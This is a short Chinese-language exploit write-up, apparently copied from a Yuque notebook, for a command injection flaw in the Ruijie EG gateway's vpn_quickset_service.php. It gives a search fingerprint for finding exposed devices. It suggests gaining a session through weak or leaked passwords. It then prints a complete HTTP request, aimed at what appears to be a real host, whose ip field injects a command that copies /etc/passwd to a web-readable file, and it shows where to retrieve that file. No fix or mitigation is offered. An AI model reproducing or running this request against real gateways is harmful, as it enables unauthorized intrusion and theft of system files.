# 锐捷EG易网关vpn_quickset_service远程代码执行漏洞

**<font style="color:rgb(38, 38, 38);">一、漏洞简介</font>**

<font style="color:rgb(38, 38, 38);">锐捷 EG易网关cli存在后台远程命令执行漏洞。</font>

<font style="color:rgb(38, 38, 38);"> </font>**<font style="color:rgb(38, 38, 38);">二、影响版本</font>**

`锐捷EG易网关`  
**<font style="color:rgb(38, 38, 38);">三、资产测绘</font>**

`app="Ruijie-EG易网关"`  
<font style="color:rgb(38, 38, 38);">●登录页面</font>  


![1710773302248-caa9069a-265b-44c3-8a1c-ee627b562553.png](./img/u1f031-bFfjq_s9P/1710773302248-caa9069a-265b-44c3-8a1c-ee627b562553-921195.webp)

  
**<font style="color:rgb(38, 38, 38);">四、漏洞复现</font>**  
1、通过弱口令或账号密码泄露漏洞登录后台获取cookie  


![1711298713325-517a2298-d16c-4786-a1f9-3e40836a4f8c.png](./img/u1f031-bFfjq_s9P/1711298713325-517a2298-d16c-4786-a1f9-3e40836a4f8c-254245.webp)

```plain
POST /itbox_pi/vpn_quickset_service.php?a=set_vpn HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Cookie: LOCAL_LANG_COOKIE=zh; RUIJIEID=bnrul7jabde55u5moo2a4q57a0; helpKey=home_sys;user=admin
X-Requested-With: XMLHttpRequest
Host: 117.40.253.197:4430
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
Content-Length: 27

ip=|cat /etc/passwd >1.txt|
```

![1714062843270-2d58deca-03fd-4c15-9993-9bfa44ecc958.png](./img/u1f031-bFfjq_s9P/1714062843270-2d58deca-03fd-4c15-9993-9bfa44ecc958-431455.png)

写入文件地址

```plain
/itbox_pi/1.txt
```

![1714062857083-b23e439d-73d8-4c6c-a7e5-533d044e9763.png](./img/u1f031-bFfjq_s9P/1714062857083-b23e439d-73d8-4c6c-a7e5-533d044e9763-938105.png)



> 更新: 2024-06-24 11:42:25  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/xaqqf2rq9u5lwp76>